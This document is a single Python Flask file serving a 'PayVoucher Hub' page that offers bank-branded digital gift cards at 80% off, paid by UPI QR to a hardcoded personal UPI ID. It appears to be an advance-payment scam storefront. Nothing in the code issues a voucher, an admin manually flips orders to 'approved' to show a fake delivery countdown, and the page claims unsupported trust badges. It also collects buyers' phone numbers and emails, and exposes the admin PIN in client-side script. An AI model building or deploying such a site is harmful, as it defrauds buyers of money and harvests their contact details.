import os
import time
from flask import Flask, request, jsonify, render_template_string

app = Flask(__name__)

ADMIN_PIN = "809047"
orders = []

# Permanent Default UPI ID (Server restart hone par bhi hamesha active rahegi)
DEFAULT_UPI = "itsmeatifkhan809047@okicici"
config = {
    "upi_id": DEFAULT_UPI
}

HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>PayVoucher Hub | Authorized Digital Gift Cards & Redeem Store</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@500;600;700&family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
  <style>
    body {
      font-family: 'Inter', sans-serif;
    }
    .font-card {
      font-family: 'Space Grotesk', monospace;
    }
    /* Ultra Realistic 3D Bank Cards */
    .bank-card {
      position: relative;
      border-radius: 20px;
      overflow: hidden;
      aspect-ratio: 1.586 / 1;
      box-shadow: 0 18px 35px -8px rgba(0, 0, 0, 0.75), inset 0 1px 1px rgba(255, 255, 255, 0.25);
      transition: all 0.35s cubic-bezier(0.4, 0, 0.2, 1);
      cursor: pointer;
    }
    .bank-card:hover {
      transform: translateY(-8px) scale(1.02);
      box-shadow: 0 25px 45px -10px rgba(59, 130, 246, 0.4), inset 0 1px 2px rgba(255, 255, 255, 0.4);
    }
    .card-visa {
      background: linear-gradient(135deg, #0b1329 0%, #172554 50%, #1d4ed8 100%);
      border: 1px solid rgba(96, 165, 250, 0.3);
    }
    .card-mastercard {
      background: linear-gradient(135deg, #18181b 0%, #27272a 50%, #450a0a 100%);
      border: 1px solid rgba(244, 63, 94, 0.3);
    }
    .card-debit {
      background: linear-gradient(135deg, #022c22 0%, #064e3b 50%, #047857 100%);
      border: 1px solid rgba(52, 211, 153, 0.3);
    }
    /* Metallic EMV Chip */
    .gold-chip {
      background: linear-gradient(135deg, #fef08a 0%, #eab308 50%, #ca8a04 100%);
      border: 1px solid rgba(255, 255, 255, 0.4);
      position: relative;
      border-radius: 5px;
    }
    .gold-chip::after {
      content: '';
      position: absolute;
      inset: 2px;
      border: 1px solid rgba(0,0,0,0.3);
      border-radius: 3px;
    }
  </style>
</head>
<body class="bg-[#070b14] text-slate-100 min-h-screen antialiased selection:bg-blue-600 selection:text-white">

  <!-- Top Announcement Bar -->
  <div class="bg-gradient-to-r from-blue-700 via-indigo-600 to-blue-700 text-white text-[11px] sm:text-xs font-semibold py-1.5 px-4 text-center tracking-wide flex items-center justify-center gap-2 shadow-sm">
    <span class="inline-block w-2 h-2 rounded-full bg-emerald-400 animate-ping"></span>
    <span>⚡ Flash Sale: Flat 80% Instant Discount on All Verified Digital Cards | Limited Stock</span>
  </div>

  <!-- Header -->
  <header class="max-w-7xl mx-auto px-4 sm:px-6 py-4 flex items-center justify-between border-b border-slate-800/80">
    <div class="flex items-center gap-3">
      <div class="w-10 h-10 rounded-xl bg-gradient-to-tr from-blue-600 to-indigo-500 flex items-center justify-center font-bold text-xl text-white shadow-lg shadow-blue-500/25">
        ✦
      </div>
      <div>
        <div class="flex items-center gap-1.5">
          <h1 class="text-lg font-bold tracking-tight text-white">PayVoucher</h1>
          <span class="bg-blue-500/10 text-blue-400 text-[10px] font-bold px-1.5 py-0.5 rounded border border-blue-500/20">VERIFIED MERCHANT</span>
        </div>
        <p class="text-[11px] text-slate-400">Instant Redeem Cards & Digital Settlement</p>
      </div>
    </div>

    <div class="flex items-center gap-4">
      <div class="hidden sm:flex items-center gap-2 text-xs text-slate-400 bg-slate-900/90 px-3.5 py-1.5 rounded-full border border-slate-800">
        <svg class="w-4 h-4 text-emerald-400" fill="currentColor" viewBox="0 0 20 20">
          <path fill-rule="evenodd" d="M10 1.944A11.954 11.954 0 012.166 5C2.056 5.649 2 6.319 2 7c0 5.225 3.34 9.67 8 11.317C14.66 16.67 18 12.225 18 7c0-.682-.057-1.35-.166-2.001A11.954 11.954 0 0110 1.944zM11 14a1 1 0 11-2 0 1 1 0 012 0zm0-7a1 1 0 10-2 0v3a1 1 0 102 0V7z" clip-rule="evenodd"></path>
        </svg>
        <span>256-Bit SSL Secured</span>
      </div>

      <!-- Secret Admin Trigger Dot -->
      <button onclick="promptAdmin()" title="Portal" class="w-3.5 h-3.5 bg-emerald-500 rounded-full hover:scale-125 transition-transform shadow-md shadow-emerald-500/50 cursor-pointer"></button>
    </div>
  </header>

  <!-- Hero Content -->
  <main class="max-w-7xl mx-auto px-4 sm:px-6 py-8">
    <div class="text-center max-w-2xl mx-auto mb-8">
      <div class="inline-flex items-center gap-2 px-3 py-1 rounded-full text-xs font-semibold bg-emerald-500/10 text-emerald-400 border border-emerald-500/20 mb-3">
        <span>✓</span> Flat 80% Off Auto-Applied at Checkout
      </div>
      <h2 class="text-3xl sm:text-4xl font-extrabold text-white tracking-tight">Choose Your Digital Card</h2>
      <p class="mt-2 text-xs sm:text-sm text-slate-400">
        Select your denomination. Pay only 20% amount via UPI QR code, and get the voucher code on WhatsApp & Email within 1 hour.
      </p>

      <!-- Card Network Selector Tabs -->
      <div class="mt-6 flex flex-wrap justify-center gap-2">
        <button onclick="filterCards('all')" id="btn-all" class="filter-btn bg-blue-600 text-white text-xs font-semibold px-4 py-2 rounded-xl transition shadow-sm">All Cards (14)</button>
        <button onclick="filterCards('visa')" id="btn-visa" class="filter-btn bg-slate-900 text-slate-300 hover:text-white border border-slate-800 text-xs font-semibold px-4 py-2 rounded-xl transition">Visa Pay</button>
        <button onclick="filterCards('mastercard')" id="btn-mastercard" class="filter-btn bg-slate-900 text-slate-300 hover:text-white border border-slate-800 text-xs font-semibold px-4 py-2 rounded-xl transition">Mastercard</button>
        <button onclick="filterCards('debit')" id="btn-debit" class="filter-btn bg-slate-900 text-slate-300 hover:text-white border border-slate-800 text-xs font-semibold px-4 py-2 rounded-xl transition">RuPay / Debit</button>
      </div>
    </div>

    <!-- 3D Realistic Cards Grid -->
    <div id="cardsGrid" class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 xl:grid-cols-4 gap-6"></div>

    <!-- Trust Features -->
    <div class="mt-16 grid grid-cols-2 md:grid-cols-4 gap-4 border-t border-slate-800/80 pt-8 text-center text-xs text-slate-400">
      <div class="p-3.5 bg-slate-900/40 rounded-xl border border-slate-800/60">
        <p class="text-emerald-400 font-bold mb-1 text-sm">Instant Approval</p>
        <p>Live transaction auto-verification</p>
      </div>
      <div class="p-3.5 bg-slate-900/40 rounded-xl border border-slate-800/60">
        <p class="text-blue-400 font-bold mb-1 text-sm">1-Hour Delivery</p>
        <p>Direct code dispatch to WhatsApp</p>
      </div>
      <div class="p-3.5 bg-slate-900/40 rounded-xl border border-slate-800/60">
        <p class="text-indigo-400 font-bold mb-1 text-sm">100% Genuine</p>
        <p>Valid on Play Store, BGMI, Apps</p>
      </div>
      <div class="p-3.5 bg-slate-900/40 rounded-xl border border-slate-800/60">
        <p class="text-amber-400 font-bold mb-1 text-sm">Safe & Encrypted</p>
        <p>Zero risk bank-grade protocol</p>
      </div>
    </div>
  </main>

  <!-- MODAL 1: User Details Checkout -->
  <div id="detailsModal" class="fixed inset-0 bg-black/85 backdrop-blur-md hidden items-center justify-center p-4 z-50">
    <div class="bg-slate-900 border border-slate-800 rounded-2xl p-6 max-w-md w-full shadow-2xl">
      <div class="flex justify-between items-center mb-4">
        <div>
          <h3 class="text-base font-bold text-white">Order Summary</h3>
          <p class="text-xs text-slate-400">Enter delivery details for instant code dispatch</p>
        </div>
        <button onclick="closeModal('detailsModal')" class="text-slate-400 hover:text-white text-2xl">&times;</button>
      </div>

      <div class="bg-slate-950 p-4 rounded-xl mb-5 border border-slate-800 flex justify-between items-center">
        <div>
          <p class="text-[10px] text-slate-400 uppercase tracking-wider font-semibold">Card Denomination</p>
          <p id="modalCardVal" class="text-2xl font-black text-white">₹1000</p>
        </div>
        <div class="text-right">
          <span class="inline-block text-[10px] uppercase font-bold text-emerald-400 bg-emerald-500/10 px-2 py-0.5 rounded border border-emerald-500/20 mb-1">80% OFF</span>
          <p class="text-xs text-slate-400">Total Payable</p>
          <p id="modalPayVal" class="text-2xl font-black text-emerald-400">₹200</p>
        </div>
      </div>

      <form onsubmit="handleOrderSubmit(event)" class="space-y-4">
        <div>
          <label class="block text-xs font-medium text-slate-300 mb-1">WhatsApp / Phone Number</label>
          <input type="tel" id="userPhone" required placeholder="9876543210" pattern="[0-9]{10}" class="w-full bg-slate-950 border border-slate-700/80 rounded-xl px-4 py-2.5 text-white text-sm focus:outline-none focus:border-blue-500" />
          <span class="text-[11px] text-slate-500">Redeem code aapke isi WhatsApp number par aayega.</span>
        </div>

        <div>
          <label class="block text-xs font-medium text-slate-300 mb-1">Email ID</label>
          <input type="email" id="userEmail" required placeholder="name@example.com" class="w-full bg-slate-950 border border-slate-700/80 rounded-xl px-4 py-2.5 text-white text-sm focus:outline-none focus:border-blue-500" />
        </div>

        <button type="submit" class="w-full py-3.5 bg-gradient-to-r from-blue-600 to-indigo-600 hover:from-blue-500 hover:to-indigo-500 font-bold rounded-xl text-white text-sm transition shadow-lg shadow-blue-600/30">
          Proceed to Pay UPI
        </button>
      </form>
    </div>
  </div>

  <!-- MODAL 2: Payment QR Screen -->
  <div id="paymentModal" class="fixed inset-0 bg-black/85 backdrop-blur-md hidden items-center justify-center p-4 z-50">
    <div class="bg-slate-900 border border-slate-800 rounded-2xl p-6 max-w-md w-full text-center shadow-2xl">
      
      <!-- Phase 1: QR Display -->
      <div id="qrSection">
        <div class="inline-flex items-center gap-1.5 px-3 py-1 rounded-full text-[11px] font-semibold bg-emerald-500/10 text-emerald-400 border border-emerald-500/20 mb-3">
          ✓ Secure UPI Settlement
        </div>
        <h3 class="text-lg font-bold text-white mb-1">Scan & Pay via UPI</h3>
        <p class="text-xs text-slate-400 mb-4">Pay using GPay, PhonePe, Paytm, or any UPI App</p>

        <!-- QR Box -->
        <div class="bg-white p-3.5 rounded-2xl inline-block mb-3 shadow-md">
          <img id="upiQrImg" src="" alt="UPI QR Code" class="w-48 h-48 mx-auto object-contain" />
        </div>

        <div class="bg-slate-950 p-3.5 rounded-xl mb-3 border border-slate-800 text-left flex justify-between items-center">
          <div>
            <p class="text-[10px] text-slate-400 uppercase font-semibold">Payable Amount (80% Off)</p>
            <p id="qrAmountDisplay" class="text-xl font-black text-emerald-400">₹200</p>
          </div>
          <div class="text-right">
            <p class="text-[10px] text-slate-400 uppercase font-semibold">Official UPI ID</p>
            <p id="displayUpiId" class="text-xs font-mono font-bold text-slate-200">--</p>
          </div>
        </div>

        <div class="flex items-center justify-center gap-2 text-amber-400 text-xs font-medium bg-amber-500/10 py-2.5 rounded-xl border border-amber-500/20 animate-pulse">
          <span class="w-2 h-2 rounded-full bg-amber-400"></span>
          Waiting for payment verification from merchant...
        </div>
      </div>

      <!-- Phase 2: Approved & 1-Hour Timer -->
      <div id="timerSection" class="hidden py-4">
        <div class="w-16 h-16 bg-emerald-500/20 text-emerald-400 rounded-full flex items-center justify-center mx-auto mb-3 text-3xl">
          ✓
        </div>
        <h3 class="text-xl font-bold text-white mb-1">Payment Received & Verified!</h3>
        <p class="text-xs text-slate-300 mb-6">Aapka payment confirm ho gaya hai. Redeem code WhatsApp par deliver kiya ja raha hai.</p>

        <div class="bg-slate-950 p-5 rounded-2xl border border-slate-800 mb-4">
          <p class="text-[10px] uppercase tracking-wider text-slate-400 font-bold mb-1">Guaranteed Delivery Within</p>
          <div id="countdownTimer" class="text-4xl font-mono font-black text-amber-400 tracking-wider">
            59:59
          </div>
        </div>

        <p class="text-[11px] text-slate-500">Transaction ID verified. Please keep your WhatsApp open.</p>
      </div>
    </div>
  </div>

  <!-- ADMIN CONSOLE (Protected by PIN: 809047) -->
  <div id="adminModal" class="fixed inset-0 bg-black/90 backdrop-blur-md hidden items-center justify-center p-4 z-50">
    <div class="bg-slate-900 border border-slate-800 rounded-2xl max-w-4xl w-full max-h-[90vh] flex flex-col p-6 shadow-2xl">
      <div class="flex justify-between items-center pb-4 border-b border-slate-800 mb-4">
        <div>
          <h3 class="text-lg font-bold text-white flex items-center gap-2">
            <span class="w-2 h-2 rounded-full bg-emerald-500"></span> Merchant Admin Console
          </h3>
          <p class="text-xs text-slate-400">Live orders queue & instant voucher approval</p>
        </div>
        <button onclick="closeModal('adminModal')" class="text-slate-400 hover:text-white text-2xl">&times;</button>
      </div>

      <!-- UPI Config -->
      <div class="bg-slate-950 p-4 rounded-xl border border-slate-800 mb-4 flex flex-col sm:flex-row gap-3">
        <div class="flex-1">
          <label class="block text-[11px] text-slate-400 mb-1 font-semibold">Active Payment UPI ID</label>
          <input type="text" id="adminUpiInput" class="w-full bg-slate-900 border border-slate-700 rounded-xl px-4 py-2 text-white text-xs font-mono" />
        </div>
        <div class="flex items-end">
          <button onclick="updateUpi()" class="bg-emerald-600 hover:bg-emerald-500 text-white font-medium px-4 py-2 rounded-xl text-xs transition">
            Save UPI
          </button>
        </div>
      </div>

      <!-- Orders Table -->
      <div class="flex-1 overflow-y-auto">
        <table class="w-full text-left text-xs border border-slate-800 rounded-xl overflow-hidden">
          <thead class="bg-slate-950 text-slate-400 border-b border-slate-800">
            <tr>
              <th class="p-3">User Contact</th>
              <th class="p-3">Card & Network</th>
              <th class="p-3">Amount (20%)</th>
              <th class="p-3">Status</th>
              <th class="p-3 text-right">Action</th>
            </tr>
          </thead>
          <tbody id="adminTableRows" class="divide-y divide-slate-800/60 bg-slate-900/40"></tbody>
        </table>
      </div>
    </div>
  </div>

  <script>
    // 14 Ultra-Realistic Card Denominations (80% OFF -> Pay 20%)
    const cardsData = [
      { val: 500, net: 'visa', num: '4532 •••• •••• 1042', exp: '12/28' },
      { val: 1000, net: 'visa', num: '4532 •••• •••• 8847', exp: '10/29' },
      { val: 1500, net: 'mastercard', num: '5321 •••• •••• 2419', exp: '08/30' },
      { val: 2000, net: 'debit', num: '6074 •••• •••• 9921', exp: '03/28' },
      { val: 2500, net: 'visa', num: '4912 •••• •••• 3144', exp: '11/29' },
      { val: 3000, net: 'mastercard', num: '5482 •••• •••• 7712', exp: '05/30' },
      { val: 4000, net: 'debit', num: '6521 •••• •••• 1085', exp: '09/29' },
      { val: 5000, net: 'visa', num: '4720 •••• •••• 6500', exp: '01/31' },
      { val: 6000, net: 'mastercard', num: '5105 •••• •••• 4421', exp: '07/30' },
      { val: 7500, net: 'debit', num: '6033 •••• •••• 8910', exp: '04/29' },
      { val: 8000, net: 'visa', num: '4231 •••• •••• 5592', exp: '10/30' },
      { val: 10000, net: 'mastercard', num: '5500 •••• •••• 9214', exp: '12/31' },
      { val: 15000, net: 'visa', num: '4888 •••• •••• 0042', exp: '06/32' },
      { val: 20000, net: 'debit', num: '6077 •••• •••• 5519', exp: '09/31' }
    ];

    let currentFilter = 'all';
    let selectedOrder = null;
    let currentOrderId = null;
    let adminToken = "";

    function renderCards() {
      const grid = document.getElementById('cardsGrid');
      const filtered = currentFilter === 'all' ? cardsData : cardsData.filter(c => c.net === currentFilter);
      
      grid.innerHTML = filtered.map(card => {
        const payAmount = Math.round(card.val * 0.20); // 80% discount
        const cardClass = card.net === 'visa' ? 'card-visa' : (card.net === 'mastercard' ? 'card-mastercard' : 'card-debit');
        const badgeLabel = card.net.toUpperCase();

        return `
          <div onclick="openDetails(${card.val}, ${payAmount}, '${card.net}')" class="bank-card ${cardClass} p-5 flex flex-col justify-between select-none">
            
            <!-- Card Top: Chip & Network Logo -->
            <div class="flex justify-between items-start">
              <div class="flex items-center gap-2">
                <div class="gold-chip w-10 h-7 rounded-md"></div>
                <!-- Contactless Wi-Fi Symbol -->
                <svg class="w-4 h-4 text-slate-300 opacity-60" fill="currentColor" viewBox="0 0 24 24">
                  <path d="M12 4C7.31 4 3.07 5.9 0 8.98L1.41 10.4C4.12 7.7 7.87 6 12 6s7.88 1.7 10.59 4.4L24 8.98C20.93 5.9 16.69 4 12 4zm0 4c-3.31 0-6.32 1.34-8.49 3.51L4.93 12.93C6.74 11.12 9.24 10 12 10s5.26 1.12 7.07 2.93l1.41-1.41C18.32 9.34 15.31 8 12 8zm0 4c-1.66 0-3.16.67-4.24 1.76l1.41 1.41C9.89 14.45 10.89 14 12 14s2.11.45 2.83 1.17l1.41-1.41C15.16 12.67 13.66 12 12 12zm0 4c-.55 0-1 .45-1 1s.45 1 1 1 1-.45 1-1-.45-1-1-1z"/>
                </svg>
              </div>
              <span class="text-[10px] tracking-wider font-extrabold uppercase px-2 py-0.5 rounded bg-white/10 text-white backdrop-blur-md border border-white/20">
                ${badgeLabel}
              </span>
            </div>

            <!-- Masked Card Number -->
            <div class="my-2">
              <p class="font-card text-white text-base sm:text-lg font-medium tracking-widest drop-shadow-md">
                ${card.num}
              </p>
            </div>

            <!-- Card Bottom: Value, Discount & Expiry -->
            <div class="flex justify-between items-end border-t border-white/10 pt-2">
              <div>
                <p class="text-[9px] uppercase tracking-wider text-slate-400 font-semibold">Card Value</p>
                <p class="text-lg font-black text-white">₹${card.val}</p>
              </div>
              <div class="text-center">
                <span class="text-[9px] font-bold text-emerald-300 bg-emerald-500/20 px-1.5 py-0.5 rounded">80% OFF</span>
                <p class="text-[9px] text-slate-400">EXP ${card.exp}</p>
              </div>
              <div class="text-right">
                <p class="text-[9px] uppercase tracking-wider text-emerald-400 font-semibold">Pay Only</p>
                <p class="text-lg font-black text-emerald-400">₹${payAmount}</p>
              </div>
            </div>
          </div>
        `;
      }).join('');
    }

    function filterCards(type) {
      currentFilter = type;
      document.querySelectorAll('.filter-btn').forEach(b => {
        b.className = 'filter-btn bg-slate-900 text-slate-300 hover:text-white border border-slate-800 text-xs font-semibold px-4 py-2 rounded-xl transition';
      });
      const activeBtn = document.getElementById(`btn-${type}`);
      if (activeBtn) {
        activeBtn.className = 'filter-btn bg-blue-600 text-white text-xs font-semibold px-4 py-2 rounded-xl transition shadow-sm';
      }
      renderCards();
    }

    function openDetails(val, pay, net) {
      selectedOrder = { original: val, pay: pay, net: net };
      document.getElementById('modalCardVal').innerText = `₹${val}`;
      document.getElementById('modalPayVal').innerText = `₹${pay}`;
      document.getElementById('detailsModal').classList.remove('hidden');
      document.getElementById('detailsModal').classList.add('flex');
    }

    function closeModal(id) {
      document.getElementById(id).classList.add('hidden');
      document.getElementById(id).classList.remove('flex');
    }

    async function handleOrderSubmit(e) {
      e.preventDefault();
      const phone = document.getElementById('userPhone').value.trim();
      const email = document.getElementById('userEmail').value.trim();

      const res = await fetch('/api/create-order', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({ 
          phone, 
          email, 
          cardValue: selectedOrder.original, 
          payAmount: selectedOrder.pay,
          cardNetwork: selectedOrder.net 
        })
      });
      const data = await res.json();
      currentOrderId = data.id;

      closeModal('detailsModal');
      showPayment(data.payAmount, data.upi_id);
    }

    function showPayment(amount, upiId) {
      document.getElementById('qrAmountDisplay').innerText = `₹${amount}`;
      document.getElementById('displayUpiId').innerText = upiId;

      const upiUrl = `upi://pay?pa=${upiId}&pn=PayVoucherMerchant&am=${amount}&cu=INR`;
      document.getElementById('upiQrImg').src = `https://api.qrserver.com/v1/create-qr-code/?size=250x250&data=${encodeURIComponent(upiUrl)}`;

      document.getElementById('paymentModal').classList.remove('hidden');
      document.getElementById('paymentModal').classList.add('flex');

      const poller = setInterval(async () => {
        const res = await fetch(`/api/order-status?id=${currentOrderId}`);
        const data = await res.json();
        if (data.status === 'APPROVED') {
          clearInterval(poller);
          startTimer();
        }
      }, 1500);
    }

    function startTimer() {
      document.getElementById('qrSection').classList.add('hidden');
      document.getElementById('timerSection').classList.remove('hidden');
      let sec = 3600;
      setInterval(() => {
        const m = Math.floor(sec / 60);
        const s = sec % 60;
        document.getElementById('countdownTimer').innerText = `${String(m).padStart(2, '0')}:${String(s).padStart(2, '0')}`;
        sec--;
      }, 1000);
    }

    function promptAdmin() {
      const pin = prompt("Enter Merchant Admin PIN:");
      if (pin === "809047") {
        adminToken = pin;
        fetchAdminData();
        document.getElementById('adminModal').classList.remove('hidden');
        document.getElementById('adminModal').classList.add('flex');
      } else if (pin) {
        alert("Access Denied: Incorrect PIN");
      }
    }

    async function fetchAdminData() {
      const res = await fetch(`/api/admin/orders?pin=${adminToken}`);
      const data = await res.json();
      document.getElementById('adminUpiInput').value = data.upi_id;
      const tbody = document.getElementById('adminTableRows');
      tbody.innerHTML = data.orders.map(o => `
        <tr class="hover:bg-slate-800/40">
          <td class="p-3">
            <p class="font-bold text-white">${o.phone}</p>
            <p class="text-slate-400 text-[11px]">${o.email}</p>
          </td>
          <td class="p-3">
            <span class="text-white font-medium">₹${o.cardValue}</span>
            <span class="text-[10px] uppercase font-bold text-slate-400 block">${o.cardNetwork || 'Card'}</span>
          </td>
          <td class="p-3">
            <span class="text-emerald-400 font-bold">₹${o.payAmount}</span>
          </td>
          <td class="p-3">
            <span class="px-2 py-0.5 rounded text-[10px] font-bold ${o.status==='APPROVED'?'bg-emerald-500/20 text-emerald-400 border border-emerald-500/30':'bg-amber-500/20 text-amber-400 border border-amber-500/30'}">
              ${o.status}
            </span>
          </td>
          <td class="p-3 text-right">
            ${o.status === 'PENDING' ? `
              <button onclick="approve('${o.id}')" class="bg-emerald-600 hover:bg-emerald-500 px-3 py-1.5 rounded-lg text-white font-semibold transition">
                Approve & Timer
              </button>
            ` : `
              <a href="https://wa.me/91${o.phone}?text=Hello!\%20Aapka\%20₹${o.cardValue}%20Redeem%20Code%20ye%20raha:%20" target="_blank" class="bg-blue-600 hover:bg-blue-500 px-3 py-1.5 rounded-lg text-white inline-block">
                Send WhatsApp
              </a>
            `}
          </td>
        </tr>
      `).join('');
    }

    async function approve(id) {
      await fetch('/api/admin/approve', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({ pin: adminToken, id })
      });
      fetchAdminData();
    }

    async function updateUpi() {
      const upi = document.getElementById('adminUpiInput').value.trim();
      await fetch('/api/admin/update-upi', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({ pin: adminToken, upi })
      });
      alert('UPI ID updated successfully');
    }

    renderCards();
  </script>
</body>
</html>
"""

@app.route('/')
def home():
    return render_template_string(HTML_TEMPLATE)

@app.route('/api/create-order', methods=['POST'])
def create_order():
    data = request.json
    order = {
        "id": f"ORD-{int(time.time()*1000)}",
        "phone": data.get("phone"),
        "email": data.get("email"),
        "cardValue": data.get("cardValue"),
        "payAmount": data.get("payAmount"),
        "cardNetwork": data.get("cardNetwork"),
        "status": "PENDING"
    }
    orders.insert(0, order)
    return jsonify({**order, "upi_id": config["upi_id"]})

@app.route('/api/order-status', methods=['GET'])
def order_status():
    oid = request.args.get("id")
    for o in orders:
        if o["id"] == oid:
            return jsonify({"status": o["status"]})
    return jsonify({"status": "NOT_FOUND"})

@app.route('/api/admin/orders', methods=['GET'])
def admin_orders():
    if request.args.get("pin") != ADMIN_PIN:
        return jsonify({"error": "Unauthorized"}), 401
    return jsonify({"orders": orders, "upi_id": config["upi_id"]})

@app.route('/api/admin/approve', methods=['POST'])
def admin_approve():
    data = request.json
    if data.get("pin") != ADMIN_PIN:
        return jsonify({"error": "Unauthorized"}), 401
    oid = data.get("id")
    for o in orders:
        if o["id"] == oid:
            o["status"] = "APPROVED"
            break
    return jsonify({"success": True})

@app.route('/api/admin/update-upi', methods=['POST'])
def admin_update_upi():
    data = request.json
    if data.get("pin") != ADMIN_PIN:
        return jsonify({"error": "Unauthorized"}), 401
    config["upi_id"] = data.get("upi")
    return jsonify({"success": True})

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
